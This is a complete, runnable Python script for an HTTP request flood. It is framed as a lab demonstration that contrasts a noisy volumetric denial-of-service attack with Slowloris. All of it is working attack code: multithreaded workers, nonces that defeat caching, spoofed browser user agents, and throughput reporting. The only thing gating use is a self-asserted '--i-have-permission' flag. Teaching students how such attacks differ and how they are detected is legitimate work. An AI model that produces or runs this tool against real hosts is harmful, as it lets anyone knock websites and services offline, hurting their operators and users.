#!/usr/bin/env python3
"""
http_flood.py -- a blunt volumetric HTTP request flood, for contrast.

WHY THIS EXISTS
---------------
Slowloris (see slowloris.py) is interesting precisely because it is *quiet*: a
handful of kilobytes per second takes a server down. This script is the
opposite -- it opens a connection, asks for a page, reads the answer, and does
it again as fast as it can.

Showing both in the same class makes a useful point: a bandwidth- or
WAF-based control has a decent chance of noticing this script, and very little
chance of noticing Slowloris, because Slowloris sends less traffic than a
single student's browser.

AUTHORISATION
-------------
Lab use only. --i-have-permission is required; see slowloris.py for the details.

Requires Python 3.8+ and nothing else.
"""

from __future__ import annotations

import argparse
import http.client
import random
import signal
import sys
import threading
import time

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:126.0) Gecko/20100101 Firefox/126.0",
]


class Stats:
    """Tiny thread-safe counter."""

    def __init__(self) -> None:
        self._lock = threading.Lock()
        self.requests = 0
        self.errors = 0
        self.bytes = 0

    def hit(self, nbytes: int) -> None:
        with self._lock:
            self.requests += 1
            self.bytes += nbytes

    def fail(self) -> None:
        with self._lock:
            self.errors += 1

    def snapshot(self) -> tuple[int, int, int]:
        with self._lock:
            return self.requests, self.errors, self.bytes


def worker(stats: Stats, opts: argparse.Namespace, stop: threading.Event) -> None:
    agent = random.choice(USER_AGENTS)

    while not stop.is_set():
        conn = None
        try:
            conn = http.client.HTTPConnection(opts.target, opts.port, timeout=opts.timeout)
            separator = "&" if "?" in opts.path else "?"
            path = "%s%s_nonce=%d" % (opts.path, separator, random.getrandbits(48))
            conn.request(
                "GET",
                path,
                headers={"User-Agent": agent, "Accept": "*/*", "Connection": "keep-alive"},
            )
            response = conn.getresponse()
            body = response.read()
            stats.hit(len(body))
        except Exception:
            stats.fail()
        finally:
            if conn is not None:
                try:
                    conn.close()
                except Exception:
                    pass


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        description="Volumetric HTTP flood, for contrast with Slowloris.",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
    )
    parser.add_argument("--target", required=True, help="victim IP or hostname")
    parser.add_argument("--port", type=int, default=80)
    parser.add_argument("--path", default="/", help="path to hammer")
    parser.add_argument("--workers", type=int, default=50, help="concurrent request threads")
    parser.add_argument("--duration", type=int, default=60, help="seconds to run (0 = until stopped)")
    parser.add_argument("--timeout", type=float, default=5.0, help="per-request timeout in seconds")
    parser.add_argument("--i-have-permission", action="store_true")
    return parser


def main(argv: list[str] | None = None) -> int:
    opts = build_parser().parse_args(argv)

    if not opts.i_have_permission:
        sys.stderr.write(
            "\nRefusing to run. This is a denial-of-service tool; pass\n"
            "--i-have-permission only if you own the target or have written authorisation.\n\n"
        )
        return 2

    if opts.workers < 1:
        sys.stderr.write("--workers must be at least 1\n")
        return 2

    stats = Stats()
    stop = threading.Event()

    def request_stop(_signum: int, _frame: object) -> None:
        stop.set()

    for sig in (signal.SIGINT, signal.SIGTERM):
        try:
            signal.signal(sig, request_stop)
        except (ValueError, OSError):
            pass

    print(
        "[http-flood] %d workers -> http://%s:%d%s for %s"
        % (
            opts.workers,
            opts.target,
            opts.port,
            opts.path,
            "until stopped" if opts.duration <= 0 else "%ds" % opts.duration,
        ),
        flush=True,
    )

    threads = [
        threading.Thread(target=worker, args=(stats, opts, stop), daemon=True)
        for _ in range(opts.workers)
    ]
    for thread in threads:
        thread.start()

    started = time.time()
    next_report = started + 5.0

    try:
        while not stop.is_set():
            time.sleep(0.25)
            now = time.time()

            if now >= next_report:
                requests, errors, nbytes = stats.snapshot()
                elapsed = max(0.001, now - started)
                print(
                    "[http-flood] requests=%-8d errors=%-7d %.0f req/s  %.0f KiB/s"
                    % (requests, errors, requests / elapsed, nbytes / elapsed / 1024.0),
                    flush=True,
                )
                next_report = now + 5.0

            if opts.duration > 0 and now - started >= opts.duration:
                break
    finally:
        stop.set()
        for thread in threads:
            thread.join(timeout=5.0)

    requests, errors, nbytes = stats.snapshot()
    elapsed = max(0.001, time.time() - started)
    print(
        "[http-flood] done: %d requests, %d errors, %.1f MiB transferred in %.0fs"
        % (requests, errors, nbytes / 1048576.0, elapsed),
        flush=True,
    )

    # In a real flood most requests fail once the server is saturated; that is
    # the expected outcome, not an error in this script.
    return 0


if __name__ == "__main__":
    sys.exit(main())
